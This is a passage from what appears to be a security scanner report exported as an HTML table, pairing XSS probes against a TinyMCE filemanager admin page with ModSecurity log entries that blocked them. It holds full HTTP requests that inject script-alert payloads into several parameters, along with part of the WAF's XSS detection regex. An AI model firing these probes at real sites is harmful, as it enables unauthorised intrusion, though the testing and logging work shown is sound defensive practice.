User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31
Accept: */*
Host: 203.17.194.79
Cookie: last_position=TestName%2F; PHPSESSID=15dlfo0l8938ln6bubdl6uuos3
Connection: Close

</td><td class=xl24 width=64 >2015-04-01 09:26:29</td><td class=xl24 width=64 >406</td><td class=xl24 width=64 >[Wed Apr 01 09:26:27 2015] [error] [client 54.173.252.77] ModSecurity: Access denied with code 406 (phase 2). Pattern match &quot;(?:\\\\b(?:(?:type\\\\b\\\\W*?\\\\b(?:text\\\\b\\\\W*?\\\\b(?:j(?:ava)?|ecma|vb)|application\\\\b\\\\W*?\\\\bx-(?:java|vb))script|c(?:opyparentfolder|reatetextrange)|get(?:special|parent)folder|iframe\\\\b.{0,100}?\\\\bsrc)\\\\b|on(?:(?:mo(?:use(?:o(?:ver|ut)|down|move|up)|ve)| ...&quot; at ARGS:type. [file &quot;/etc/apache2/sites-enabled/000-default-indusind-base.conf&quot;] [line &quot;492&quot;] [id &quot;94&quot;] [msg &quot;Cross-site Scripting (XSS) Attack&quot;] [data &quot;'&gt;&lt;script&gt;alert(275899)&lt;/script&gt;&lt;!--&quot;] [severity &quot;CRITICAL&quot;] [tag &quot;WEB_ATTACK/XSS&quot;] [hostname &quot;54.173.252.77&quot;] [uri &quot;/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php&quot;] [unique_id &quot;VRtsa6wQAW0AAD9hYNYAAAAC&quot;]</td><td class=xl24 width=64 >94</td><td class=xl24 width=64 >VRtsa6wQAW0AAD9hYNYAAAAC</td></tr><tr><td class=xl24 width=64 >3012</td><td class=xl24 width=64 >8366750</td><td class=xl24 width=64 >2015-03-31 18:34:52</td><td class=xl24 width=64 >&lt;p&gt;The Web application is vulnerable to cross-site scripting (XSS), which allows attackers to take advantage of
 Web server scripts to inject JavaScript or HTML code that is executed on the client-side browser.
 
This vulnerability is often caused by server-side scripts written in languages such as PHP, ASP, .NET, Perl or Java,
 which do not adequately filter data sent along with page requests or by vulnerable HTTP servers.

This malicious code appears to come from your Web application when it runs in the browser of an unsuspecting user.&lt;/p&gt;


&lt;p&gt;An attacker can do the following damage with an expoloit script:


&lt;ul&gt;
&lt;li&gt;access other sites inside another client&amp;#39;s private intranet&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s submitted form data&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s submitted form data before it reaches the server&lt;/li&gt;
&lt;li&gt;submit a form to your Web application on the user&amp;#39;s behalf that modifies passwords or other application data&lt;/li&gt;&lt;/ul&gt;

&lt;/p&gt;



&lt;p&gt;The two most common methods of attack are:

&lt;ul&gt;
&lt;li&gt;Having a user click a URL link sent in an e-mail&lt;/li&gt;
&lt;li&gt;Having a user click  a URL link while visiting a Web site&lt;/li&gt;&lt;/ul&gt;
&lt;/p&gt;


&lt;p&gt;In both scenarios, the URL will generally link to the trusted site, but will contain additional data that is used to
 trigger the XSS attack.&lt;/p&gt;


&lt;p&gt;Note that SSL connectivity does not protect against this issue.&lt;/p&gt;</td><td class=xl24 width=64 >http://203.17.194.79/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=&amp;relative_url=0&amp;akey=key&amp;fldr=test/&amp;551ac1cc893bd</td><td class=xl24 width=64 >get</td><td class=xl24 width=64 >type</td><td class=xl24 width=64 >GET /edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=&quot;&gt;&lt;script&gt;alert(695099)&lt;/script&gt;&lt;!--&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=100&amp;relative_url=0&amp;akey=key&amp;fldr=test/&amp;551ac1cc893bd=TestName HTTP/1.1
Referer: http://203.17.194.79/edelweiss/admin/index.php
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31
Accept: */*
Host: 203.17.194.79
Cookie: last_position=test%2F; PHPSESSID=apcpfddphoebvu7vf6n9ij3rs5
Connection: Close

</td><td class=xl24 width=64 >2015-04-01 09:26:30</td><td class=xl24 width=64 >406</td><td class=xl24 width=64 >[Wed Apr 01 09:26:29 2015] [error] [client 54.173.252.77] ModSecurity: Access denied with code 406 (phase 2). Pattern match &quot;(?:\\\\b(?:(?:type\\\\b\\\\W*?\\\\b(?:text\\\\b\\\\W*?\\\\b(?:j(?:ava)?|ecma|vb)|application\\\\b\\\\W*?\\\\bx-(?:java|vb))script|c(?:opyparentfolder|reatetextrange)|get(?:special|parent)folder|iframe\\\\b.{0,100}?\\\\bsrc)\\\\b|on(?:(?:mo(?:use(?:o(?:ver|ut)|down|move|up)|ve)| ...&quot; at ARGS:type. [file &quot;/etc/apache2/sites-enabled/000-default-indusind-base.conf&quot;] [line &quot;492&quot;] [id &quot;94&quot;] [msg &quot;Cross-site Scripting (XSS) Attack&quot;] [data &quot;\\x22&gt;&lt;script&gt;alert(695099)&lt;/script&gt;&lt;!--&quot;] [severity &quot;CRITICAL&quot;] [tag &quot;WEB_ATTACK/XSS&quot;] [hostname &quot;54.173.252.77&quot;] [uri &quot;/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php&quot;] [unique_id &quot;VRtsbawQAW0AAHewA8oAAAAN&quot;]</td><td class=xl24 width=64 >94</td><td class=xl24 width=64 >VRtsbawQAW0AAHewA8oAAAAN</td></tr><tr><td class=xl24 width=64 >3012</td><td class=xl24 width=64 >8366751</td><td class=xl24 width=64 >2015-03-31 18:35:09</td><td class=xl24 width=64 >&lt;p&gt;The Web application is vulnerable to cross-site scripting (XSS), which allows attackers to take advantage of
 Web server scripts to inject JavaScript or HTML code that is executed on the client-side browser.
 
This vulnerability is often caused by server-side scripts written in languages such as PHP, ASP, .NET, Perl or Java,
 which do not adequately filter data sent along with page requests or by vulnerable HTTP servers.

This malicious code appears to come from your Web application when it runs in the browser of an unsuspecting user.&lt;/p&gt;


&lt;p&gt;An attacker can do the following damage with an expoloit script:


&lt;ul&gt;
&lt;li&gt;access other sites inside another client&amp;#39;s private intranet&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s submitted form data&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s submitted form data before it reaches the server&lt;/li&gt;
&lt;li&gt;submit a form to your Web application on the user&amp;#39;s behalf that modifies passwords or other application data&lt;/li&gt;&lt;/ul&gt;

&lt;/p&gt;



&lt;p&gt;The two most common methods of attack are:

&lt;ul&gt;
&lt;li&gt;Having a user click a URL link sent in an e-mail&lt;/li&gt;
&lt;li&gt;Having a user click  a URL link while visiting a Web site&lt;/li&gt;&lt;/ul&gt;
&lt;/p&gt;


&lt;p&gt;In both scenarios, the URL will generally link to the trusted site, but will contain additional data that is used to
 trigger the XSS attack.&lt;/p&gt;


&lt;p&gt;Note that SSL connectivity does not protect against this issue.&lt;/p&gt;</td><td class=xl24 width=64 >http://203.17.194.79/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=&amp;relative_url=0&amp;akey=key&amp;fldr=</td><td class=xl24 width=64 >get</td><td class=xl24 width=64 >lang</td><td class=xl24 width=64 >GET /edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=&quot;&gt;&lt;script&gt;alert(996999)&lt;/script&gt;&lt;!--&amp;popup=0&amp;crossdomain=0&amp;field_id=100&amp;relative_url=0&amp;akey=key&amp;fldr=TestName HTTP/1.1
Referer: http://203.17.194.79/edelweiss/admin/index.php
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31
Accept: */*
Host: 203.17.194.79
Cookie: last_position=TestName%2F; PHPSESSID=ubtdc7spf2m7pjjqjvg73scod2
Connection: Close

</td><td class=xl24 width=64 >2015-04-01 09:26:31</td><td class=xl24 width=64 >406</td><td class=xl24 width=64 >[Wed Apr 01 09:26:30 2015] [error] [client 54.173.252.77] ModSecurity: Access denied with code 406 (phase 2). Pattern match &quot;(?:\\\\b(?:(?:type\\\\b\\\\W*?\\\\b(?:text\\\\b\\\\W*?\\\\b(?:j(?:ava)?|ecma|vb)|application\\\\b\\\\W*?\\\\bx-(?:java|vb))script|c(?:opyparentfolder|reatetextrange)|get(?:special|parent)folder|iframe\\\\b.{0,100}?\\\\bsrc)\\\\b|on(?:(?:mo(?:use(?:o(?:ver|ut)|down|move|up)|ve)| ...&quot; at ARGS:lang. [file &quot;/etc/apache2/sites-enabled/000-default-indusind-base.conf&quot;] [line &quot;492&quot;] [id &quot;94&quot;] [msg &quot;Cross-site Scripting (XSS) Attack&quot;] [data &quot;\\x22&gt;&lt;script&gt;alert(996999)&lt;/script&gt;&lt;!--&quot;] [severity &quot;CRITICAL&quot;] [tag &quot;WEB_ATTACK/XSS&quot;] [hostname &quot;54.173.252.77&quot;] [uri &quot;/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php&quot;] [unique_id &quot;VRtsbqwQAW0AABvT@GYAAAAL&quot;]</td><td class=xl24 width=64 >94</td><td class=xl24 width=64 >VRtsbqwQAW0AABvT@GYAAAAL</td></tr><tr><td class=xl24 width=64 >3012</td><td class=xl24 width=64 >8366752</td><td class=xl24 width=64 >2015-03-31 18:36:54</td><td class=xl24 width=64 >&lt;p&gt;The Web application is vulnerable to cross-site scripting (XSS), which allows attackers to take advantage of
 Web server scripts to inject JavaScript or HTML code that is executed on the client-side browser.
 
This vulnerability is often caused by server-side scripts written in languages such as PHP, ASP, .NET, Perl or Java,
 which do not adequately filter data sent along with page requests or by vulnerable HTTP servers.

This malicious code appears to come from your Web application when it runs in the browser of an unsuspecting user.&lt;/p&gt;


&lt;p&gt;An attacker can do the following damage with an expoloit script:


&lt;ul&gt;
&lt;li&gt;access other sites inside another client&amp;#39;s private intranet&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s submitted form data&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s submitted form data before it reaches the server&lt;/li&gt;
&lt;li&gt;submit a form to your Web application on the user&amp;#39;s behalf that modifies passwords or other application data&lt;/li&gt;&lt;/ul&gt;

&lt;/p&gt;



&lt;p&gt;The two most common methods of attack are:

&lt;ul&gt;
&lt;li&gt;Having a user click a URL link sent in an e-mail&lt;/li&gt;
&lt;li&gt;Having a user click  a URL link while visiting a Web site&lt;/li&gt;&lt;/ul&gt;
&lt;/p&gt;


&lt;p&gt;In both scenarios, the URL will generally link to the trusted site, but will contain additional data that is used to
 trigger the XSS attack.&lt;/p&gt;


&lt;p&gt;Note that SSL connectivity does not protect against this issue.&lt;/p&gt;</td><td class=xl24 width=64 >http://203.17.194.79/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=&amp;relative_url=0&amp;akey=key&amp;fldr=test/&amp;551ac1cc89409</td><td class=xl24 width=64 >get</td><td class=xl24 width=64 >type</td><td class=xl24 width=64 >GET /edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=&quot;&gt;&lt;script&gt;alert(327899)&lt;/script&gt;&lt;!--&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=100&amp;relative_url=0&amp;akey=key&amp;fldr=test/&amp;551ac1cc89409=TestName HTTP/1.1
Referer: http://203.17.194.79/edelweiss/admin/index.php
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31
Accept: */*
Host: 203.17.194.79
Cookie: last_position=test%2F; PHPSESSID=iu7ppjod7vkh2n64pg8b9uhog0
Connection: Close

</td><td class=xl24 width=64 >2015-04-01 09:26:32</td><td class=xl24 width=64 >406</td><td class=xl24 width=64 >[Wed Apr 01 09:26:31 2015] [error] [client 54.173.252.77] ModSecurity: Access denied with code 406 (phase 2). Pattern match &quot;(?:\\\\b(?:(?:type\\\\b\\\\W*?\\\\b(?:text\\\\b\\\\W*?\\\\b(?:j(?:ava)?|ecma|vb)|application\\\\b\\\\W*?\\\\bx-(?:java|vb))script|c(?:opyparentfolder|reatetextrange)|get(?:special|parent)folder|iframe\\\\b.{0,100}?\\\\bsrc)\\\\b|on(?:(?:mo(?:use(?:o(?:ver|ut)|down|move|up)|ve)| ...&quot; at ARGS:type. [file &quot;/etc/apache2/sites-enabled/000-default-indusind-base.conf&quot;] [line &quot;492&quot;] [id &quot;94&quot;] [msg &quot;Cross-site Scripting (XSS) Attack&quot;] [data &quot;\\x22&gt;&lt;script&gt;alert(327899)&lt;/script&gt;&lt;!--&quot;] [severity &quot;CRITICAL&quot;] [tag &quot;WEB_ATTACK/XSS&quot;] [hostname &quot;54.173.252.77&quot;] [uri &quot;/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php&quot;] [unique_id &quot;VRtsb6wQAW0AAHee9@YAAAAA&quot;]</td><td class=xl24 width=64 >94</td><td class=xl24 width=64 >VRtsb6wQAW0AAHee9@YAAAAA</td></tr><tr><td class=xl24 width=64 >3012</td><td class=xl24 width=64 >8366753</td><td class=xl24 width=64 >2015-03-31 18:38:17</td><td class=xl24 width=64 >&lt;p&gt;The Web application is vulnerable to cross-site scripting (XSS), which allows attackers to take advantage of
 Web server scripts to inject JavaScript or HTML code that is executed on the client-side browser.
 
This vulnerability is often caused by server-side scripts written in languages such as PHP, ASP, .NET, Perl or Java,
 which do not adequately filter data sent along with page requests or by vulnerable HTTP servers.

This malicious code appears to come from your Web application when it runs in the browser of an unsuspecting user.&lt;/p&gt;


&lt;p&gt;An attacker can do the following damage with an expoloit script:


&lt;ul&gt;
&lt;li&gt;access other sites inside another client&amp;#39;s private intranet&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s submitted form data&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s submitted form data before it reaches the server&lt;/li&gt;
&lt;li&gt;submit a form to your Web application on the user&amp;#39;s behalf that modifies passwords or other application data&lt;/li&gt;&lt;/ul&gt;

&lt;/p&gt;



&lt;p&gt;The two most common methods of attack are:

&lt;ul&gt;
&lt;li&gt;Having a user click a URL link sent in an e-mail&lt;/li&gt;
&lt;li&gt;Having a user click  a URL link while visiting a Web site&lt;/li&gt;&lt;/ul&gt;
&lt;/p&gt;


&lt;p&gt;In both scenarios, the URL will generally link to the trusted site, but will contain additional data that is used to
 trigger the XSS attack.&lt;/p&gt;


&lt;p&gt;Note that SSL connectivity does not protect against this issue.&lt;/p&gt;</td><td class=xl24 width=64 >http://203.17.194.79/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=&amp;relative_url=0&amp;akey=key&amp;fldr=&amp;551ac1cc4bcfb</td><td class=xl24 width=64 >get</td><td class=xl24 width=64 >lang</td><td class=xl24 width=64 >GET /edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang='&gt;&lt;script&gt;alert(681599)&lt;/script&gt;&lt;!--&amp;popup=0&amp;crossdomain=0&amp;field_id=100&amp;relative_url=0&amp;akey=key&amp;fldr=TestName&amp;551ac1cc4bcfb=TestName HTTP/1.1
Referer: http://203.17.194.79/edelweiss/admin/index.php
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31
Accept: */*
Host: 203.17.194.79
Cookie: last_position=TestName%2F; PHPSESSID=1m7vleksmtdqf7lf32bmv674o6
Connection: Close

</td><td class=xl24 width=64 >2015-04-01 09:26:34</td><td class=xl24 width=64 >406</td><td class=xl24 width=64 >[Wed Apr 01 09:26:32 2015] [error] [client 54.173.252.77] ModSecurity: Access denied with code 406 (phase 2). Pattern match &quot;(?:\\\\b(?:(?:type\\\\b\\\\W*?\\\\b(?:text\\\\b\\\\W*?\\\\b(?:j(?:ava)?|ecma|vb)|application\\\\b\\\\W*?\\\\bx-(?:java|vb))script|c(?:opyparentfolder|reatetextrange)|get(?:special|parent)folder|iframe\\\\b.{0,100}?\\\\bsrc)\\\\b|on(?:(?:mo(?:use(?:o(?:ver|ut)|down|move|up)|ve)| ...&quot; at ARGS:lang. [file &quot;/etc/apache2/sites-enabled/000-default-indusind-base.conf&quot;] [line &quot;492&quot;] [id &quot;94&quot;] [msg &quot;Cross-site Scripting (XSS) Attack&quot;] [data &quot;'&gt;&lt;script&gt;alert(681599)&lt;/script&gt;&lt;!--&quot;] [severity &quot;CRITICAL&quot;] [tag &quot;WEB_ATTACK/XSS&quot;] [hostname &quot;54.173.252.77&quot;] [uri &quot;/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php&quot;] [unique_id &quot;VRtscKwQAW0AAHhB764AAAAD&quot;]</td><td class=xl24 width=64 >94</td><td class=xl24 width=64 >VRtscKwQAW0AAHhB764AAAAD</td></tr><tr><td class=xl24 width=64 >3012</td><td class=xl24 width=64 >8366754</td><td class=xl24 width=64 >2015-03-31 18:38:38</td><td class=xl24 width=64 >&lt;p&gt;The Web application is vulnerable to cross-site scripting (XSS), which allows attackers to take advantage of
 Web server scripts to inject JavaScript or HTML code that is executed on the client-side browser.
 
This vulnerability is often caused by server-side scripts written in languages such as PHP, ASP, .NET, Perl or Java,
 which do not adequately filter data sent along with page requests or by vulnerable HTTP servers.

This malicious code appears to come from your Web application when it runs in the browser of an unsuspecting user.&lt;/p&gt;


&lt;p&gt;An attacker can do the following damage with an expoloit script:


&lt;ul&gt;
&lt;li&gt;access other sites inside another client&amp;#39;s private intranet&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s submitted form data&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s submitted form data before it reaches the server&lt;/li&gt;
&lt;li&gt;submit a form to your Web application on the user&amp;#39;s behalf that modifies passwords or other application data&lt;/li&gt;&lt;/ul&gt;

&lt;/p&gt;



&lt;p&gt;The two most common methods of attack are:

&lt;ul&gt;
&lt;li&gt;Having a user click a URL link sent in an e-mail&lt;/li&gt;
&lt;li&gt;Having a user click  a URL link while visiting a Web site&lt;/li&gt;&lt;/ul&gt;
&lt;/p&gt;


&lt;p&gt;In both scenarios, the URL will generally link to the trusted site, but will contain additional data that is used to
 trigger the XSS attack.&lt;/p&gt;


&lt;p&gt;Note that SSL connectivity does not protect against this issue.&lt;/p&gt;</td><td class=xl24 width=64 >http://203.17.194.79/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=&amp;relative_url=0&amp;akey=key&amp;fldr=</td><td class=xl24 width=64 >get</td><td class=xl24 width=64 >popup</td><td class=xl24 width=64 >GET /edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=&quot;&gt;&lt;script&gt;alert(551899)&lt;/script&gt;&lt;!--&amp;crossdomain=0&amp;field_id=100&amp;relative_url=0&amp;akey=key&amp;fldr=TestName HTTP/1.1
Referer: http://203.17.194.79/edelweiss/admin/index.php
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31
Accept: */*
Host: 203.17.194.79
Cookie: last_position=TestName%2F; PHPSESSID=35aklfpqk3q4sestcb6dm1lon0
Connection: Close

</td><td class=xl24 width=64 >2015-04-01 09:26:35</td><td class=xl24 width=64 >406</td><td class=xl24 width=64 >[Wed Apr 01 09:26:34 2015] [error] [client 54.173.252.77] ModSecurity: Access denied with code 406 (phase 2). Pattern match &quot;(?:\\\\b(?:(?:type\\\\b\\\\W*?\\\\b(?:text\\\\b\\\\W*?\\\\b(?:j(?:ava)?|ecma|vb)|application\\\\b\\\\W*?\\\\bx-(?:java|vb))script|c(?:opyparentfolder|reatetextrange)|get(?:special|parent)folder|iframe\\\\b.{0,100}?\\\\bsrc)\\\\b|on(?:(?:mo(?:use(?:o(?:ver|ut)|down|move|up)|ve)| ...&quot; at ARGS:popup. [file &quot;/etc/apache2/sites-enabled/000-default-indusind-base.conf&quot;] [line &quot;492&quot;] [id &quot;94&quot;] [msg &quot;Cross-site Scripting (XSS) Attack&quot;] [data &quot;\\x22&gt;&lt;script&gt;alert(551899)&lt;/script&gt;&lt;!--&quot;] [severity &quot;CRITICAL&quot;] [tag &quot;WEB_ATTACK/XSS&quot;] [hostname &quot;54.173.252.77&quot;] [uri &quot;/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php&quot;] [unique_id &quot;VRtscqwQAW0AABt@bVUAAAAB&quot;]</td><td class=xl24 width=64 >94</td><td class=xl24 width=64 >VRtscqwQAW0AABt@bVUAAAAB</td></tr><tr><td class=xl24 width=64 >3012</td><td class=xl24 width=64 >8366755</td><td class=xl24 width=64 >2015-03-31 18:40:01</td><td class=xl24 width=64 >&lt;p&gt;The Web application is vulnerable to cross-site scripting (XSS), which allows attackers to take advantage of
 Web server scripts to inject JavaScript or HTML code that is executed on the client-side browser.
 
This vulnerability is often caused by server-side scripts written in languages such as PHP, ASP, .NET, Perl or Java,
 which do not adequately filter data sent along with page requests or by vulnerable HTTP servers.

This malicious code appears to come from your Web application when it runs in the browser of an unsuspecting user.&lt;/p&gt;


&lt;p&gt;An attacker can do the following damage with an expoloit script:


&lt;ul&gt;
&lt;li&gt;access other sites inside another client&amp;#39;s private intranet&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s submitted form data&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s submitted form data before it reaches the server&lt;/li&gt;
&lt;li&gt;submit a form to your Web application on the user&amp;#39;s behalf that modifies passwords or other application data&lt;/li&gt;&lt;/ul&gt;

&lt;/p&gt;



&lt;p&gt;The two most common methods of attack are:

&lt;ul&gt;
&lt;li&gt;Having a user click a URL link sent in an e-mail&lt;/li&gt;
&lt;li&gt;Having a user click  a URL link while visiting a Web site&lt;/li&gt;&lt;/ul&gt;
&lt;/p&gt;


&lt;p&gt;In both scenarios, the URL will generally link to the trusted site, but will contain additional data that is used to
 trigger the XSS attack.&lt;/p&gt;


&lt;p&gt;Note that SSL connectivity does not protect against this issue.&lt;/p&gt;</td><td class=xl24 width=64 >http://203.17.194.79/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=&amp;relative_url=0&amp;akey=key&amp;fldr=test/&amp;551ac1cc893bd</td><td class=xl24 width=64 >get</td><td class=xl24 width=64 >lang</td><td class=xl24 width=64 >GET /edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang='&gt;&lt;script&gt;alert(901599)&lt;/script&gt;&lt;!--&amp;popup=0&amp;crossdomain=0&amp;field_id=100&amp;relative_url=0&amp;akey=key&amp;fldr=test/&amp;551ac1cc893bd=TestName HTTP/1.1
Referer: http://203.17.194.79/edelweiss/admin/index.php
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31
Accept: */*
Host: 203.17.194.79
Cookie: last_position=test%2F; PHPSESSID=lci9a0qc4j521n5jq0ibvpqh16
Connection: Close

</td><td class=xl24 width=64 >2015-04-01 09:26:36</td><td class=xl24 width=64 >406</td><td class=xl24 width=64 >[Wed Apr 01 09:26:35 2015] [error] [client 54.173.252.77] ModSecurity: Access denied with code 406 (phase 2). Pattern match &quot;(?:\\\\b(?:(?:type\\\\b\\\\W*?\\\\b(?:text\\\\b\\\\W*?\\\\b(?:j(?:ava)?|ecma|vb)|application\\\\b\\\\W*?\\\\bx-(?:java|vb))script|c(?:opyparentfolder|reatetextrange)|get(?:special|parent)folder|iframe\\\\b.{0,100}?\\\\bsrc)\\\\b|on(?:(?:mo(?:use(?:o(?:ver|ut)|down|move|up)|ve)| ...&quot; at ARGS:lang. [file &quot;/etc/apache2/sites-enabled/000-default-indusind-base.conf&quot;] [line &quot;492&quot;] [id &quot;94&quot;] [msg &quot;Cross-site Scripting (XSS) Attack&quot;] [data &quot;'&gt;&lt;script&gt;alert(901599)&lt;/script&gt;&lt;!--&quot;] [severity &quot;CRITICAL&quot;] [tag &quot;WEB_ATTACK/XSS&quot;] [hostname &quot;54.173.252.77&quot;] [uri &quot;/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php&quot;] [unique_id &quot;VRtsc6wQAW0AAHchlU0AAAAE&quot;]</td><td class=xl24 width=64 >94</td><td class=xl24 width=64 >VRtsc6wQAW0AAHchlU0AAAAE</td></tr><tr><td class=xl24 width=64 >3012</td><td class=xl24 width=64 >8366756</td><td class=xl24 width=64 >2015-03-31 18:41:46</td><td class=xl24 width=64 >&lt;p&gt;The Web application is vulnerable to cross-site scripting (XSS), which allows attackers to take advantage of
 Web server scripts to inject JavaScript or HTML code that is executed on the client-side browser.
 
This vulnerability is often caused by server-side scripts written in languages such as PHP, ASP, .NET, Perl or Java,
 which do not adequately filter data sent along with page requests or by vulnerable HTTP servers.

This malicious code appears to come from your Web application when it runs in the browser of an unsuspecting user.&lt;/p&gt;


&lt;p&gt;An attacker can do the following damage with an expoloit script:


&lt;ul&gt;
&lt;li&gt;access other sites inside another client&amp;#39;s private intranet&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s submitted form data&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s submitted form data before it reaches the server&lt;/li&gt;
&lt;li&gt;submit a form to your Web application on the user&amp;#39;s behalf that modifies passwords or other application data&lt;/li&gt;&lt;/ul&gt;

&lt;/p&gt;



&lt;p&gt;The two most common methods of attack are:

&lt;ul&gt;
&lt;li&gt;Having a user click a URL link sent in an e-mail&lt;/li&gt;
&lt;li&gt;Having a user click  a URL link while visiting a Web site&lt;/li&gt;&lt;/ul&gt;
&lt;/p&gt;


&lt;p&gt;In both scenarios, the URL will generally link to the trusted site, but will contain additional data that is used to
 trigger the XSS attack.&lt;/p&gt;


&lt;p&gt;Note that SSL connectivity does not protect against this issue.&lt;/p&gt;</td><td class=xl24 width=64 >http://203.17.194.79/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=&amp;relative_url=0&amp;akey=key&amp;fldr=&amp;551ac1cc4bcfb</td><td class=xl24 width=64 >get</td><td class=xl24 width=64 >popup</td><td class=xl24 width=64 >GET /edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=&quot;&gt;&lt;script&gt;alert(694399)&lt;/script&gt;&lt;!--&amp;crossdomain=0&amp;field_id=100&amp;relative_url=0&amp;akey=key&amp;fldr=TestName&amp;551ac1cc4bcfb=TestName HTTP/1.1
Referer: http://203.17.194.79/edelweiss/admin/index.php
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31
Accept: */*
Host: 203.17.194.79
Cookie: last_position=TestName%2F; PHPSESSID=8vbp2p7gq5oibu029shm46rfh4
Connection: Close

</td><td class=xl24 width=64 >2015-04-01 09:26:37</td><td class=xl24 width=64 >406</td><td class=xl24 width=64 >[Wed Apr 01 09:26:36 2015] [error] [client 54.173.252.77] ModSecurity: Access denied with code 406 (phase 2). Pattern match &quot;(?:\\\\b(?:(?:type\\\\b\\\\W*?\\\\b(?:text\\\\b\\\\W*?\\\\b(?:j(?:ava)?|ecma|vb)|application\\\\b\\\\W*?\\\\bx-(?:java|vb))script|c(?:opyparentfolder|reatetextrange)|get(?:special|parent)folder|iframe\\\\b.{0,100}?\\\\bsrc)\\\\b|on(?:(?:mo(?:use(?:o(?:ver|ut)|down|move|up)|ve)| ...&quot; at ARGS:popup. [file &quot;/etc/apache2/sites-enabled/000-default-indusind-base.conf&quot;] [line &quot;492&quot;] [id &quot;94&quot;] [msg &quot;Cross-site Scripting (XSS) Attack&quot;] [data &quot;\\x22&gt;&lt;script&gt;alert(694399)&lt;/script&gt;&lt;!--&quot;] [severity &quot;CRITICAL&quot;] [tag &quot;WEB_ATTACK/XSS&quot;] [hostname &quot;54.173.252.77&quot;] [uri &quot;/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php&quot;] [unique_id &quot;VRtsdKwQAW0AAHgzvz8AAAAG&quot;]</td><td class=xl24 width=64 >94</td><td class=xl24 width=64 >VRtsdKwQAW0AAHgzvz8AAAAG</td></tr><tr><td class=xl24 width=64 >3012</td><td class=xl24 width=64 >8366757</td><td class=xl24 width=64 >2015-03-31 18:42:04</td><td 